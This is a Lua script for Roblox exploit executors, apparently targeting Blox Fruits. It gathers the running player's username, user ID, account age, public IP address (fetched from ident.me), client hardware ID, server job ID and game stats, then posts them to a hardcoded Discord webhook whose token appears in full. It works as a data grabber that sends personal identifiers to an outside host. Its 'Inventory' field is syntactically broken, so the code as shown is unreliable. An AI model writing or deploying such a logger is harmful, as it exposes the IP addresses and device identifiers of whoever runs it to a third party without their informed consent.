local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- Player Info
local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local AccountAge = LocalPlayer.AccountAge
local Date = os.date("%m/%d/%Y")
local Time = os.date("%X")
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local beli = game.Players.LocalPlayer.Data.Beli.Value
local frag = game.Players.LocalPlayer.Data.Fragments.Value
local race = game.Players.LocalPlayer.Data.Race.Value
local fruit = game.Players.LocalPlayer.Data.DevilFruit.Value
local level = game.Players.LocalPlayer.Data.Level.Value
local ConsoleJobId = game.JobId 
if fruit == '' then
    fruit = 'None'
end
-- Game Info
local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

local function formatNumberWithCommas(number)
    local formatted = tostring(number)
    local k = string.len(formatted) % 3
    if k == 0 then k = 3 end
    local result = string.sub(formatted, 1, k)
    while k < string.len(formatted) do
        result = result .. "," .. string.sub(formatted, k + 1, k + 3)
        k = k + 3
    end
    return result
end
local function detectExecutor()
    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
                    or (secure_load and "Sentinel")
                    or (pebc_execute and "ProtoSmasher")
                    or (KRNL_LOADED and "Krnl")
                    or (is_sirhurt_closure and "SirHurt")
                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
                    or "Unsupported"
    return executor
end

local beliFormatted = formatNumberWithCommas(beli)
local fragFormatted = formatNumberWithCommas(frag)
local levelFormatted = formatNumberWithCommas(level)

local ConsoleJobId = game.JobId 

local function createWebhookData()
    local webhookcheck = detectExecutor()
    
    local data = {
        ["username"] = "Cheoling",
        ["content"] = ping,
        ["embeds"] = {
            {
                ["title"] = GAMENAME,
                ["fields"] = {
                    {
                        ["name"] = "Game Info",
                        ["value"] = string.format("**Game:** %s \n**Game Id**: %d \n**Exploit:** %s",
                                                GAMENAME, game.PlaceId, webhookcheck),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "User Info",
                        ["value"] = string.format("**User ID:** ||%d||\n**Username:** ||%s||\n**Account Age:** %d\n**Date:** %s\n**Time:** %s",
                                                  Userid, Name, AccountAge, Date, Time),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Job Id",
                        ["value"] = string.format("```\n%s\n```", ConsoleJobId),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Player Stat",
                        ["value"] = string.format("**Level:** %s\n**Beli:** %s\n**Frag:** %s\n**Race:** %s\n**Fruit:** %s",
                                                levelFormatted,beliFormatted, fragFormatted, race, fruit),
                        ["inline"] = true
                    },
                    {
                        ["name"] = 'Inventory'
                        ["value"]
                    }
                },
                ["type"] = "rich",
                ["color"] = tonumber("FFD700"), 
                ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"},
            }
        }
    }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}

    local success, response = pcall(function()
        return request(abcdef)
    end)

    if success then
        print("Webhook sent successfully!")
        print("Response Body:", response.Body)
    else
        print("Error sending webhook:", response)
    end
end

local webhookUrl = "https://discord.com/api/webhooks/1143190544579837952/HdDKvVfPYdUyFw7eEdKMIkB8Y_DsFu8MMpcVE_xuh8pWm6JDZ13m9xbT-urNw_6t91WL"
local webhookData = createWebhookData()

sendWebhook(webhookUrl, webhookData)
